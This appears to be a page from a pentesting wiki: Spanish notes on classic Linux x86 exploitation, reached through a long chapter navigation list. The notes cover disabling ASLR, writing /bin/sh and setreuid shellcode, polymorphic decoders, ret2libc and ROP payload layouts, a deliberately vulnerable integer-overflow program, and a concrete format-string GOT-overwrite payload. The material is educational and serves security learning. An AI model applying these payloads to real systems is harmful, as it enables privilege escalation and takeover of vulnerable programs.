        <li class="chapter " data-level="16.8" data-path="../../general/6881-udp-pentesting-bittorrent.html">
            
                <a href="../../general/6881-udp-pentesting-bittorrent.html">
            
                    
                    6881/udp - Pentesting BitTorrent
            
                </a>
            

            
        </li>
    
        <li class="chapter " data-level="16.9" data-path="../../ctf-write-ups/">
            
                <a href="../../ctf-write-ups/">
            
                    
                    CTF Write-ups
            
                </a>
            

            
            <ul class="articles">
                
    
        <li class="chapter " data-level="16.9.1" data-path="../../ctf-write-ups/try-hack-me/">
            
                <a href="../../ctf-write-ups/try-hack-me/">
            
                    
                    Try Hack Me
            
                </a>
            

            
            <ul class="articles">
                
    
        <li class="chapter " data-level="16.9.1.1" data-path="../../ctf-write-ups/try-hack-me/hc0n-christmas-ctf-2019.html">
            
                <a href="../../ctf-write-ups/try-hack-me/hc0n-christmas-ctf-2019.html">
            
                    
                    hc0n Christmas CTF - 2019
            
                </a>
            

            
        </li>
    
        <li class="chapter " data-level="16.9.1.2" data-path="../../ctf-write-ups/try-hack-me/pickle-rick.html">
            
                <a href="../../ctf-write-ups/try-hack-me/pickle-rick.html">
            
                    
                    Pickle Rick
            
                </a>
            

            
        </li>
    

            </ul>
            
        </li>
    

            </ul>
            
        </li>
    
        <li class="chapter " data-level="16.10" data-path="../../general/1911-pentesting-fox.html">
            
                <a href="../../general/1911-pentesting-fox.html">
            
                    
                    1911 - Pentesting fox
            
                </a>
            

            
        </li>
    
        <li class="chapter " data-level="16.11" data-path="../../general/online-platforms-with-api.html">
            
                <a href="../../general/online-platforms-with-api.html">
            
                    
                    Online Platforms with API
            
                </a>
            

            
        </li>
    
        <li class="chapter " data-level="16.12" data-path="../../general/phising-documents.html">
            
                <a href="../../general/phising-documents.html">
            
                    
                    Phising Documents
            
                </a>
            

            
        </li>
    
        <li class="chapter " data-level="16.13" data-path="../../general/reset-password.html">
            
                <a href="../../general/reset-password.html">
            
                    
                    Reset/Forgoten Password Bypass
            
                </a>
            

            
        </li>
    
        <li class="chapter " data-level="16.14" data-path="../../general/stealing-sensitive-information-disclosure-from-a-web.html">
            
                <a href="../../general/stealing-sensitive-information-disclosure-from-a-web.html">
            
                    
                    Stealing Sensitive Information Disclosure from a Web
            
                </a>
            

            
        </li>
    

    

    <li class="divider"></li>

    <li>
        <a href="https://www.gitbook.com" target="blank" class="gitbook-link">
            Published with GitBook
        </a>
    </li>
</ul>


                </nav>
            
        
    </div>

    <div class="book-body">
        
            <div class="body-inner">
                
                    

<div class="book-header" role="navigation">
    

    <!-- Title -->
    <h1>
        <i class="fa fa-circle-o-notch fa-spin"></i>
        <a href="../.." >Linux Exploiting (Basic) (SPA)</a>
    </h1>
</div>




                    <div class="page-wrapper" tabindex="-1" role="main">
                        <div class="page-inner">
                            
<div id="book-search-results">
    <div class="search-noresults">
    
                                <section class="normal markdown-section">
                                
                                <h1 id="linux-exploiting-basic-spa">Linux Exploiting (Basic) (SPA)</h1>
<h2 id="aslr"><strong>ASLR</strong></h2>
<p>Aleatorizaci&#xF3;n de direcciones</p>
<p><strong>Desactiva aleatorizacion(ASLR) GLOBAL (root)</strong>:<br>echo 0 &gt; /proc/sys/kernel/randomize_va_space<br>Reactivar aletorizacion GLOBAL: echo 2 &gt; /proc/sys/kernel/randomize_va_space</p>
<p><strong>Desactivar para una ejecuci&#xF3;n</strong> (no requiere root):<br>setarch `arch` -R ./ejemplo argumentos<br>setarch `uname -m` -R ./ejemplo argumentos</p>
<p><strong>Desactivar protecci&#xF3;n de ejecuci&#xF3;n en pila</strong><br>gcc -fno-stack-protector -D_FORTIFY_SOURCE=0 -z norelro -z execstack ejemplo.c -o ejemplo</p>
<p><strong>Core file</strong><br>ulimit -c unlimited<br>gdb /exec core_file<br>/etc/security/limits.conf -&gt; *               soft    core            unlimited</p>
<p><strong>Text<br>Data<br>BSS<br>Heap</strong></p>
<p><strong>Stack</strong></p>
<h2 id="1stack-overflows"><strong>1.STACK OVERFLOWS</strong></h2>
<blockquote>
<p>buffer overflow, buffer overrun, stack overrun, stack smashing</p>
</blockquote>
<p>Fallo de segmentaci&#xF3;n o violaci&#xF3;n de segmento: Cuando se intenta acceder a una direcci&#xF3;n de memoria que no ha sido asignada al proceso.</p>
<p><strong>Secci&#xF3;n BSS</strong>: Variables globales o est&#xE1;ticas sin inicializar</p>
<pre><code class="lang-text">static int i;
</code></pre>
<p><strong>Secci&#xF3;n DATA</strong>: Variables globales o est&#xE1;ticas inicializadas</p>
<pre><code class="lang-text">int i = 5;
</code></pre>
<p><strong>Secci&#xF3;n TEXT</strong>: Instrucciones del c&#xF3;digo (opcodes)</p>
<p><strong>Secci&#xF3;n HEAP</strong>: Buffer reservados de forma din&#xE1;nima (malloc(), calloc(), realloc() )</p>
<p><strong>Secci&#xF3;n STACK</strong>: La pila (Argumentos pasados, cadenas de entorno (env), variables locales&#x2026;)</p>
<p>Para obtener la direcci&#xF3;n de una funci&#xF3;n dentro de un programa se puede hacer:</p>
<pre><code class="lang-text">objdump -d ./PROGRAMA | grep FUNCION
</code></pre>
<h2 id="2shellcode"><strong>2.SHELLCODE</strong></h2>
<p>Ver interrupciones de kernel: cat /usr/include/i386-linux-gnu/asm/unistd_32.h | grep &#x201C;__NR_&#x201D;</p>
<p>setreuid(0,0); // __NR_setreuid 70<br>execve(&#x201C;/bin/sh&#x201D;, args[], NULL); // __NR_execve 11<br>exit(0); // __NR_exit 1</p>
<p>xor eax, eax ; limpiamos eax<br>xor ebx, ebx ; ebx = 0 pues no hay argumento que pasar<br>mov al, 0x01 ; eax = 1 &#x2014;&gt; __NR_exit 1<br>int 0x80 ;        Ejecutar syscall</p>
<p><strong>nasm -f elf assembly.asm</strong> &#x2014;&gt; Nos devuelve un .o<br><strong>ld assembly.o -o shellcodeout</strong> &#x2014;&gt; Nos da un ejecutable formado por el c&#xF3;digo ensamblador y podemos sacar los opcodes con <strong>objdump<br>objdump -d  -Mintel ./shellcodeout</strong> &#x2014;&gt; Para ver que efectivamente es nuestra shellcode y sacar los OpCodes</p>
<p><strong>Comprobar que la shellcode funciona</strong></p>
<pre><code class="lang-text">char shellcode[] = &#x201C;\x31\xc0\x31\xdb\xb0\x01\xcd\x80&#x201D;

void main(){
            void (*fp) (void);
            fp = (void *)shellcode;
            fp();
}&lt;span id=&quot;mce_marker&quot; data-mce-type=&quot;bookmark&quot; data-mce-fragment=&quot;1&quot;&gt;&#x200B;&lt;/span&gt;
</code></pre>
<p>Para ver que las llamadas al sistema se realizan correctamente se debe compilar el programa anterior y las llamadas del sistema deben aparecer en <strong>strace ./PROGRAMA_COMPILADO</strong></p>
<p>A la hora de crear shellcodes se puede realizar un truco. La primera instrucci&#xF3;n es un jump a un call. El call llama al c&#xF3;digo original y adem&#xE1;s mete en el stack el EIP. Despu&#xE9;s de la instrucci&#xF3;n call hemos metido el string que necesit&#xE1;semos, por lo que con ese EIP podemos se&#xF1;alar al string y adem&#xE1;s continuar ejecutando el c&#xF3;digo.</p>
<p>EJ <strong>TRUCO (/bin/sh)</strong>:</p>
<pre><code class="lang-text">jmp                 0x1f                                        ; Salto al &#xFA;ltimo call
popl                %esi                                       ; Guardamos en ese la direcci&#xF3;n al string
movl               %esi, 0x8(%esi)       ; Concatenar dos veces el string (en este caso /bin/sh)
xorl                 %eax, %eax             ; eax = NULL
movb  %eax, 0x7(%esi)     ; Ponemos un NULL al final del primer /bin/sh
movl               %eax, 0xc(%esi)      ; Ponemos un NULL al final del segundo /bin/sh
movl   $0xb, %eax               ; Syscall 11
movl               %esi, %ebx               ; arg1=&#x201C;/bin/sh&#x201D;
leal                 0x8(%esi), %ecx      ; arg[2] = {&#x201C;/bin/sh&#x201D;, &#x201C;0&#x201D;}
leal                 0xc(%esi), %edx      ; arg3 = NULL
int                    $0x80                         ; excve(&#x201C;/bin/sh&#x201D;, [&#x201C;/bin/sh&#x201D;, NULL], NULL)
xorl                 %ebx, %ebx             ; ebx = NULL
movl   %ebx, %eax            
inc                   %eax                          ; Syscall 1
int                    $0x80                         ; exit(0)
call                  -0x24                          ; Salto a la primera instruci&#xF3;n
.string             \&#x201D;/bin/sh\&#x201D;                               ; String a usar&lt;span id=&quot;mce_marker&quot; data-mce-type=&quot;bookmark&quot; data-mce-fragment=&quot;1&quot;&gt;&#x200B;&lt;/span&gt;
</code></pre>
<p><strong>EJ usando el Stack(/bin/sh):</strong>  </p>
<pre><code class="lang-text">section .text
global _start
_start:
xor                  eax, eax                     ;Limpieza
mov                al, 0x46                      ; Syscall 70
xor                  ebx, ebx                     ; arg1 = 0
xor                  ecx, ecx                     ; arg2 = 0
int                    0x80                           ; setreuid(0,0)
xor                  eax, eax                     ; eax = 0
push   eax                             ; &#x201C;\0&#x201D;
push               dword 0x68732f2f ; &#x201C;//sh&#x201D;
push               dword 0x6e69622f; &#x201C;/bin&#x201D;
mov                ebx, esp                     ; arg1 = &#x201C;/bin//sh\0&#x201D;
push               eax                             ; Null -&gt; args[1]
push               ebx                             ; &#x201C;/bin/sh\0&#x201D; -&gt; args[0]
mov                ecx, esp                     ; arg2 = args[]
mov                al, 0x0b                      ; Syscall 11
int                    0x80                           ; excve(&#x201C;/bin/sh&#x201D;, args[&#x201C;/bin/sh&#x201D;, &#x201C;NULL&#x201D;], NULL)
</code></pre>
<p><strong>EJ FNSTENV:</strong></p>
<pre><code class="lang-text">fabs
fnstenv [esp-0x0c]
pop eax                     ; Guarda el EIP en el que se ejecut&#xF3; fabs
&#x2026;
</code></pre>
<p><strong>Egg Huter:</strong></p>
<p>Consiste en un peque&#xF1;o c&#xF3;digo que recorre las p&#xE1;ginas de memoria asociadas a un proceso en busca de la shellcode ahi guardada (busca alguna firma puesta en la shellcode). &#xDA;til en los casos en los que solo se tiene un peque&#xF1;o espacio para inyectar c&#xF3;digo.</p>
<p><strong>Shellcodes polim&#xF3;rficos</strong></p>
<p>Consisten el shells cifradas que tienen un peque&#xF1;o c&#xF3;digos que las descifran y saltan a &#xE9;l, usando el truco de Call-Pop este ser&#xED;a un <strong>ejemplo cifrado cesar</strong>:</p>
<pre><code class="lang-text">global _start
_start:
            jmp short magic
init:
            pop     esi
            xor      ecx, ecx
            mov    cl,0                              ; Hay que sustituir el 0 por la longitud del shellcode (es lo que recorrer&#xE1;)
desc:
            sub     byte[esi + ecx -1], 0 ; Hay que sustituir el 0 por la cantidad de bytes a restar (cifrado cesar)
            sub     cl, 1
            jnz       desc
            jmp     short sc
magic:
            call init
sc:
            ;Aqu&#xED; va el shellcode
</code></pre>
<ol>
<li><strong>Atacando el Frame Pointer (EBP)</strong></li>
</ol>
<p>&#xDA;til en una situaci&#xF3;n en la que podemos modificar el EBP pero no el EIP.</p>
<p>Se sabe que al salir de una funci&#xF3;n se ejecuta el siguente c&#xF3;digo ensamblador:</p>
<pre><code class="lang-text">movl               %ebp, %esp
popl                %ebp
ret
</code></pre>
<p>De esta forma, si se puede modificar el EBP al salir de una funci&#xF3;n (fvuln) que ha sido llamada por otra funci&#xF3;n, cuando la funci&#xF3;n que llam&#xF3; a fvuln finalice, su EIP puede ser modificado.</p>
<p>En fvuln se puede introducir un EBP falso que apunte a un sitio donde est&#xE9; la direcci&#xF3;nd e la shellcode + 4 (hay que sumarle 4 por el pop). As&#xED;, al salir de la funci&#xF3;n, se meter&#xE1; en ESP el valor de &amp;(&amp;Shellcode)+4, con el pop se le restar&#xE1; 4 al ESP y este apuntar&#xE1; a la direcci&#xF3;n de la shellcode cuando se ejcute el ret.</p>
<p><strong>Exploit:</strong><br>&amp;Shellcode + &quot;AAAA&quot; + SHELLCODE + relleno + &amp;(&amp;Shellcode)+4</p>
<p><strong>Off-by-One Exploit</strong><br>Se permite modificar tan solo el byte menos significativo del EBP. Se puede llevar a cabo un ataque como el anterior pero la memoria que guarda la direcci&#xF3;n de la shellcode debe compartir los 3 primeros bytes con el EBP.</p>
<h2 id="4-m&#xE9;todos-return-to-libc"><strong>4. M&#xE9;todos return to Libc</strong></h2>
<p>M&#xE9;todo &#xFA;til cuando el stack no es ejecutable o deja un buffer muy peque&#xF1;o para modificar.</p>
<p>El ASLR provoca que en cada ejecuci&#xF3;n las funciones se carguen en posiciones distintas de la memoria. Por lo tanto este m&#xE9;todo puede no ser efectivo en ese caso. Para servidores remotos, como el programa est&#xE1; siendo ejecutado constantemente en la misma direcci&#xF3;n s&#xED; puede ser &#xFA;til.</p>
<ul>
<li><strong>cdecl(C declaration)</strong> Mete los argumentos en el stack y tras salir de la funci&#xF3;n limpia la pila</li>
<li><strong>stdcall(standard call)</strong> Mete los argumentos en la pila y es la funci&#xF3;n llamada la que la limpia</li>
<li><strong>fastcall</strong> Mete los dos primeros argumentos en registros y el resto en la pila</li>
</ul>
<p>Se pone la direcci&#xF3;n de la instrucci&#xF3;n system de libc y se le pasa como argumento el string &#x201C;/bin/sh&#x201D;, normalmente desde una variable de entorno. Adem&#xE1;s, se usa la direcci&#xF3;n a la funci&#xF3;n exit para que una vez que no se requiera m&#xE1;s la shell, salga el programa sin dar problemas (y escribir logs).</p>
<p><strong>export SHELL=/bin/sh</strong></p>
<p>Para encontrar las direcciones que necesitaremos se puede mirar dentro de <strong>GDB:<br>p system<br>p exit<br>rabin2 -i ejecutable</strong> &#x2014;&gt; Da la direcci&#xF3;n de todas las funciones que usa el programa al cargarse<br>(Dentro de un start o algun breakpoint): <strong>x/500s $esp</strong> &#x2014;&gt; Buscamos dentro de aqui el string /bin/sh</p>
<p>Una vez tengamos estas direcciones el <strong>exploit</strong> quedar&#xED;a:</p>
<p>&#x201C;A&#x201D; * DISTANCIA EBP + 4 (EBP: pueden ser 4 &quot;A&quot;s aunque mejor si es el EBP real para evitar fallos de segmentaci&#xF3;n) + Direcci&#xF3;n de <strong>system</strong> (sobreescribir&#xE1; el EIP) + Direcci&#xF3;n de <strong>exit</strong> (al salir de system(&#x201C;/bin/sh&#x201D;) se llamar&#xE1; a esta funci&#xF3;n pues los primero 4bytes del stack son tratados como la siguiente direcci&#xF3;n del EIP a ejecutar) + Direcci&#xF3;n de &#x201C;<strong>/bin/sh</strong>&#x201D; (ser&#xE1; el par&#xE1;metro pasado a system)</p>
<p>De esta forma el EIP se sobreescribir&#xE1; con la direcci&#xF3;n de system la cual recibir&#xE1; como par&#xE1;metro el string &#x201C;/bin/sh&#x201D; y al salir de este ejecutar&#xE1; la funci&#xF3;n exit().</p>
<p>Es posible encontrarse en la situaci&#xF3;n de que alg&#xFA;n byte de alguna direcci&#xF3;n de alguna funci&#xF3;n sea nulo o espacio (\x20). En ese caso se pueden desensamblar las direcciones anteriores a dicha funci&#xF3;n pues probablemente haya varios NOPs que nos permitan poder llamar a alguno de ellos en vez de a la funci&#xF3;n directamente (por ejemplo con &gt; x/8i system-4).</p>
<p>Este m&#xE9;todo funciona pues al llamar a una funci&#xF3;n como system usando el opcode <strong>ret</strong> en vez de <strong>call</strong>, la funci&#xF3;n entiende que los primeros 4bytes ser&#xE1;n la direcci&#xF3;n <strong>EIP</strong>  a la que volver.</p>
<p>Una t&#xE9;cnica interesante con este m&#xE9;todo es el llamar a <strong>strncpy()</strong> para mover un payload del stack al heap y posteriormente usar <strong>gets()</strong> para ejecutar dicho payload.</p>
<p>Otra t&#xE9;cnica interesante es el uso de <strong>mprotect()</strong> la cual permite asignar los permisos deseados a cualquier parte de la memoria. Sirve o serv&#xED;a en BDS, MacOS y OpenBSD, pero no en linux(controla que no se puedan otorgar a la vez permisos de escritura y ejecuci&#xF3;n). Con este ataque se podr&#xED;a volver a configurar la pila como ejecutable.</p>
<h4 id="encadenamiento-de-funciones"><strong>Encadenamiento de funciones</strong></h4>
<p>Bas&#xE1;ndonos en la t&#xE9;cnica anterior, esta forma de exploit consiste en:<br>Relleno + &amp;Funci&#xF3;n1 + &amp;pop;ret; + &amp;arg_fun1 + &amp;Funci&#xF3;n2 + &amp;pop;ret; + &amp;arg_fun2 + &#x2026;</p>
<p>De esta forma se pueden encadenar funciones a las que llamar. Adem&#xE1;s, si se quieren usar funciones con varios argumentos, se pueden poder los argumentos necesarios (ej 4) y poner los 4 argumentos y buscar direcci&#xF3;n a un sitio con opcodes: pop, pop, pop, pop, ret &#x2014;&gt; <strong>objdump -d ejecutable</strong></p>
<h4 id="encadenamiento-mediante-falseo-de-frames-encadenamiento-de-ebps"><strong>Encadenamiento mediante falseo de frames (encadenamiento de EBPs)</strong></h4>
<p>Consiste en aprovechar el poder manipular el EBP para ir encadenando la ejecuci&#xF3;n de varias funciones a trav&#xE9;s del EBP y de &quot;leave;ret&quot;</p>
<p>RELLENO  </p>
<ul>
<li>Situamos en el EBP un EBP falso que apunta a: 2&#xBA; EBP_falso + la funci&#xF3;n a ejecutar: (&amp;system() + &amp;leave;ret + &amp;&#x201C;/bin/sh&#x201D;)  </li>
<li>En el EIP ponemos de direcci&#xF3;n una funci&#xF3;n &amp;(leave;ret)</li>
</ul>
<p>Iniciamos la shellcode con la direcci&#xF3;n a la siguiente parte de la shellcode, por ej: 2&#xBA;EBP_falso + &amp;system() + &amp;(leave;ret;) + &amp;&#x201D;/bin/sh&#x201D;</p>
<p>el 2&#xBA;EBP ser&#xED;a: 3&#xBA;EBP_falso + &amp;system() + &amp;(leave;ret;) + &amp;&#x201D;/bin/ls&#x201D;</p>
<p>Esta shellcode se puede repetir indefinidamente en las partes de memoria a las que se tenga acceso de forma que se conseguir&#xE1; una shellcode f&#xE1;cilmente divisible por peque&#xF1;os trozos de memoria.</p>
<p>(Se encadena la ejecuci&#xF3;n de funciones mezclando las vulnerabilidades vistas anteriormente de EBP y de ret2lib)</p>
<h2 id="5m&#xE9;todos-complementarios"><strong>5.M&#xE9;todos complementarios</strong></h2>
<h4 id="ret2ret"><strong>Ret2Ret</strong></h4>
<p>&#xDA;til para cuando no se puede meter una direcci&#xF3;n del stack en el EIP (se comprueba que el EIP no contenga 0xbf) o cuando no se puede calcular la ubicaci&#xF3;n de la shellcode. Pero, la funci&#xF3;n vulnerable acepte un par&#xE1;metro (la shellcode ir&#xE1; aqu&#xED;).</p>
<p>De esta forma, al cambiar el EIP por una direcci&#xF3;n a un <strong>ret</strong>, se cargar&#xE1; la siguiente direcci&#xF3;n (que es la direcci&#xF3;n del primer argumento de la funci&#xF3;n). Es decir, se cargar&#xE1; la shellcode.</p>
<p>El exploit quedar&#xED;a: SHELLCODE + Relleno (hasta EIP) + <strong>&amp;ret</strong> (los siguientes bytes de la pila apuntan al inicio de la shellcode pues se mete en el stack la direcci&#xF3;n al par&#xE1;metro pasado)</p>
<p>Al parecer funciones como <strong>strncpy</strong> una vez completas eliminan de la pila la direcci&#xF3;n donde estaba guardada la shellcode imposibilitando esta t&#xE9;cnica. Es decir, la direcci&#xF3;n que pasan a la funci&#xF3;n como argumento (la que guarda la shellcode) es modificada por un 0x00 por lo que al llamar al segundo <strong>ret</strong> se encuentra con un 0x00 y el programa muere.</p>
<pre><code>        **Ret2PopRet**
</code></pre><p>Si no tenemos control sobre el primer argumento pero s&#xED; sobre el segundo o el tercero, podemos sobreescribir EIP con una direcci&#xF3;n a pop-ret o pop-pop-ret, seg&#xFA;n la que necesitemos.</p>
<h4 id="t&#xE9;cnica-de-murat"><strong>T&#xE9;cnica de Murat</strong></h4>
<p>En linux todos los progamas se mapean comenzando en 0xbfffffff</p>
<p>Viendo como se construye la pila de un nuevo proceso en linux se puede desarrollar un exploit de forma que programa sea arrancado en un entorno cuya &#xFA;nica variable sea la shellcode. La direcci&#xF3;n de esta entonces se puede calcular como: addr = 0xbfffffff - 4 - strlen(NOMBRE_ejecutable_completo) - strlen(shellcode)</p>
<p>De esta forma se obtendr&#xED;a de forma sensilla la direcci&#xF3;n donde est&#xE1; la variable de entorno con la shellcode.</p>
<p>Esto se puede hacer gracias a que la funci&#xF3;n execle permite crear un entorno que solo tenga las variables de entorno que se deseen</p>
<h4 id="jump-to-esp-windows-style"><strong>Jump to ESP: Windows Style</strong></h4>
<p>Debido a que el ESP est&#xE1; apuntando al comienzo del stack siempre, esta t&#xE9;cnica consiste con sustituir el EIP con la direcci&#xF3;n a una llamada a <strong>jmp esp</strong> o <strong>call esp</strong>. De esta forma, se guarda la shellcode despu&#xE9;s de la sobreescritura del EIP ya que despu&#xE9;s de ejecutar el <strong>ret</strong> el ESP se encontrar&#xE1; apuntando a la direcci&#xF3;n siguiente, justo donde se ha guardado la shellcode.</p>
<p>En caso de que no se tenga el ASLR activo en Windows o Linux se puede llamar a <strong>jmp esp</strong> o <strong>call esp</strong> almacenadas en alg&#xFA;n objeto compartido. En caso de que est&#xE9; el ASLR, se podr&#xED;a buscar dentro del propio programa vulnerable.</p>
<p>Adem&#xE1;s, el hecho de poder colocar la shellcode despu&#xE9;s de la corrupci&#xF3;n del EIP en vez de en medio del stack, permite que las instrucciones push o pop que se ejecuten en medio de la funci&#xF3;n no lleguen a tocar la shellcode (cosa que podr&#xED;a ocurrir en caso de ponerse en medio del stack de la funci&#xF3;n).</p>
<p>De forma muy similar a esto si sabemos que una funci&#xF3;n devuelve la direcci&#xF3;n donde est&#xE1; guardada la shellcode se puede llamar a <strong>call eax</strong> o <strong>jmp eax (ret2eax).</strong></p>
<h4 id="rop-return-oriented-programming-o-borrowed-code-chunks"><strong>ROP (Return Oriented Programming) o borrowed code chunks</strong></h4>
<p>Los trozos de c&#xF3;digo que se invocan se conocen como gadgets.</p>
<p>Esta t&#xE9;cnica consiste en encadenar distintas llamadas a funciones mediante la t&#xE9;cnica de <strong>ret2libc</strong> y el uso de <strong>pop,ret</strong>.</p>
<p>En algunas arquitecturas de procesadores cada instrucci&#xF3;n es un conjunto de 32bits (MIPS por ej). Sin embargo, en Intel las instrucciones son de tama&#xF1;o variable y varias instrucciones pueden compartir un conjunto de bits, por ejemplo:</p>
<p><strong>movl $0xe4ff, -0x(%ebp)</strong> &#x2014;&gt; Contiene los bytes 0xffe4 que tambi&#xE9;n se traducen por: <strong>jmp *%esp</strong></p>
<p>De esta forma se pueden ejecutar algunas instrucciones que realmente ni si quiera est&#xE1; en el programa original</p>
<p><strong>ROPgadget.py</strong> nos ayuda a encontrar valores en binarios</p>
<p>Este programa tambi&#xE9;n sirve para crear los <strong>payloads</strong>. Le puedes dar la librer&#xED;a de la que quieres sacar los ROPs y &#xE9;l generar&#xE1; un payload en python al cual tu le das la direcci&#xF3;n en la que est&#xE1; dicha librer&#xED;a y el payload ya est&#xE1; listo para ser usado como shellcode. Adem&#xE1;s, como usa llamadas al sistema no ejecuta realmente nada en el stack sino que solo va guardando direcciones de ROPs que se ejecutar&#xE1;n mediante <strong>ret</strong>. Para usar este payload hay que llamar al payload mediante una instrucci&#xF3;n <strong>ret</strong>.</p>
<h4 id="integer-overflows"><strong>Integer overflows</strong></h4>
<p>Este tipo de overflows se producen cuando una variable no est&#xE1; preparada para soportar un n&#xFA;mero tan grande como se le pasa, posiblemente por una confusi&#xF3;n entre variables con y sin signo, por ejemplo:</p>
<pre><code class="lang-text">#include &lt;stdion.h&gt;
#include &lt;string.h&gt;
#include &lt;stdlib.h&gt;

int main(int argc, char *argv[]){
int len;
unsigned int l;
char buffer[256];
int i;
len = l = strtoul(argv[1], NULL, 10);
printf(&#x201C;\nL = %u\n&#x201D;, l);
printf(&#x201C;\nLEN = %d\n&#x201D;, len);
if (len &gt;= 256){
printf(&#x201C;\nLongitus excesiva\n&#x201D;);
exit(1);
}
if(strlen(argv[2]) &lt; l)
strcpy(buffer, argv[2]);
else
printf(&#x201C;\nIntento de hack\n&#x201D;);
return 0;
}
</code></pre>
<p>En el ejemplo anterior vemos que el programa se espera 2 par&#xE1;metros. El primero la longitud de la siguiente cadena y el segundo la cadena.</p>
<p>Si le pasamos como primer par&#xE1;metro un n&#xFA;mero negativo saldr&#xE1; que len &lt; 256 y pasaremos ese filtro, y adem&#xE1;s tambi&#xE9;n strlen(buffer) ser&#xE1; menor que l, pues l es unsigned int y ser&#xE1; muy grande.</p>
<p>Este tipo de overflows no busca lograr escribir algo en el proceso del programa, sino superar filtros mal dise&#xF1;ados para explotar otras vulnerabilidades.</p>
<h4 id="variables-no-inicializadas"><strong>Variables no inicializadas</strong></h4>
<p>No se sabe el valor que puede tomar una variable no inicializada y podr&#xED;a ser interesante observarlo. Puede ser que tome el valor que tomaba una variable de la funci&#xF3;n anterior y esta sea controlada por el atacante.</p>
<h2 id="6explotando-format-strings"><strong>6.Explotando format strings</strong></h2>
<p>Cuando se llama a printf se ponen los par&#xE1;metros de forma ordenada.</p>
<p>%08x &#x2014;&gt; 8 bytes hexadecimales<br>%d &#x2014;&gt; Entero<br>%u &#x2014;&gt; Entero sin signo<br>%s &#x2014;&gt; Cadena<br>%n &#x2014;&gt; Bytes escritos<br>%hn &#x2014;&gt; Ocupa 2 bytes en vez de 4<br>&lt;n&gt;$X &#x2014;&gt; Par&#xE1;metro de acceso directo &#x2014;&gt; (&#x201C;%3$d&#x201D;, var1, var2, var3) &#x2014;&gt; Accede directamente a var3</p>
<p>AAAA.%08x.%08x.%08x.%08x.%08x.%08x.%08x.%08x.<br>AAAA.%4$x &#x2014;&gt; 4&#xBA; parametro<br>AAAA%.6000x%4$n &#x2014;&gt; Se escribe 6004 en la direcci&#xF3;n que apunta el 4&#xBA; parametro<br>AAAA%6000d%4$n &#x2014;&gt; Se escribe 6004 en la direcci&#xF3;n que apunta el 4&#xBA; parametro<br>AAAA.%500$08x &#x2014;&gt; Par&#xE1;metro en el offset 500</p>
<p><strong>objdump -t ./exec | grep varBss<br>objdump -TR ./exec | grep exit(func lib)<br>objdump -d ./exec | grep funcCode<br>objdump -D ./exec | grep &quot;VAR_NAME&quot;</strong> --&gt; Direccion de memoria donde se carga una variable st&#xE1;tica (en la region DATA)</p>
<p>Con %n escribimos el n&#xFA;mero bytes escritos y normalmente podremos controlar d&#xF3;nde, si por ejemplo queremos escribir el valor 400 en una direcci&#xF3;n que es el 8&#xBA; par&#xE1;metro:</p>
<p>python -c &#x2018;print &#x201C;DIRECCION&#x201D; &#x2019;%.396d%8$n</p>
<h4 id="dtor"><strong>DTOR</strong></h4>
<p>Los destructores son funciones que se ejecutan justo antes de la finalizaci&#xF3;n de un programa.</p>
<p><strong>objdump -s -j .dtors /exec<br>rabin -s /exec | grep &#x201C;__DTOR&#x201D;</strong></p>
<p>Si se logra escribir algo en __DTOR_END__ la direcci&#xF3;n de una shellcode, esta se ejecutar&#xE1; a la salida del programa.</p>
<p>Los DTOR se encuentran entre los valores ffffffff y 00000000, por lo que si no hay ning&#xFA;n DTOR encontraremos al ejecutar el <strong>objdump</strong> esos valores seguidos. Entonces, si introducimos una valor entre ambos, ser&#xE1; tomado como lla direcci&#xF3;n de una funci&#xF3;n y se ejecutar&#xE1; (es decir, hay que sobreescribir el 00000000).</p>
<p>Es raro que hoy en d&#xED;a un binario tenga DTORs.</p>
<h4 id="got-tabla-de-offsets-global---mejor-esta-que-la-anterior-si-se-puede-elegir"><strong>GOT (Tabla de offsets global) - Mejor esta que la anterior si se puede elegir</strong></h4>
<p>Contiene las direcciones absolutas de las funciones que son utilizadas en un programa.</p>
<p><strong>objdump -s -j .got ./exec<br>(peda)&gt; x/20x 0xDIR_GOT</strong> --&gt; Se ve una lista con las direcciones de las funciones<br><strong>(peda)&gt; x/i 0xDIR_FUNC_GOT</strong> --&gt; Ver&#xED;amos el inicio de una funci&#xF3;n (probablemente un push ebp)</p>
<h4 id="exploit-format-strings"><strong>Exploit (format strings)</strong></h4>
<p>Si modificamos el valor de la direcci&#xF3;n de una de estas funciones y apuntamos a una shellcode y esta funci&#xF3;n se ejecuta despu&#xE9;s del printf tendremos un exploit.</p>
<p>Para escribir la direcci&#xF3;n de una shellcode normalmente hay que escribirla en dos pasos, primero 2 bytes y luego los otros 2, para ello se usa $hn.</p>
<p>HOB &#x2014;&gt; 2bytes superiores de la direcci&#xF3;n de la shellcode<br>LOB &#x2014;&gt; 2bytes inferiores de la direcci&#xF3;n de la shellcode</p>
<p>Hay que escribir siempre primero el menor de [HOB, LOB] y luego el otro.</p>
<p>Si HOB &lt; LOB<br>[direcci&#xF3;n+2][direccion]%.[HOB-8]x%[offset]$hn%.[LOB-HOB]x%[offset+1]</p>
<p>Si HOB &gt; LOB<br>[direcci&#xF3;n+2][direccion]%.[LOB-8]x%[offset+1]$hn%.[HOB-LOB]x%[offset]</p>
<p>HOB                                       LOB                            HOB_shellcode-8        N&#xBA;Param_dir_HOB      LOB_shell-HOB_shell         N&#xBA;Param_dir_LOB</p>
<p>`python -c &apos;print &quot;\x26\x97\x04\x08&quot;+&quot;\x24\x97\x04\x08&quot;+         &quot;%.49143x&quot;        +       &quot;%4$hn&quot;          +          &quot;%.15408x&quot;                +          &quot;%5$hn&quot;&apos;`</p>
<h4 id="format-strings-como-buffer-overflows"><strong>Format Strings como Buffer Overflows</strong></h4>
<p>La funci&#xF3;n <strong>sprintf</strong> copia a un string (char *str) lo mismo que se le pasar&#xED;a a una funci&#xF3;n printf. Es decir, si no tiene en cuenta el formato (&#x201C;%s&#x201D;), y el string introducido es dominado por el atacante, se puede introducir una cadena como %.44xAAAA &#x2014;&gt; Que har&#xE1; escribir 44bytes +&#x201D;AAAA&#x201D; en *str y eso puede provocar un bufferoverflow.</p>
<h4 id="estructuras-atexit-ya-no-&#xFA;til-en-general"><strong>Estructuras __atexit (ya no &#xFA;til en general)</strong></h4>
<p>atexit() es una funci&#xF3;n a la cu&#xE1;l se le pasan como par&#xE1;metros otras funciones y estas funciones se ejecutar&#xE1;n al ejecutarse un exit() o el return del main.</p>
<p>Si se consigue modificar la direcci&#xF3;n de alguna de estas funciones para que apunte a un shellcode se ganar&#xED;a el control del proceso, pero actualmente esto es m&#xE1;s complicado.</p>
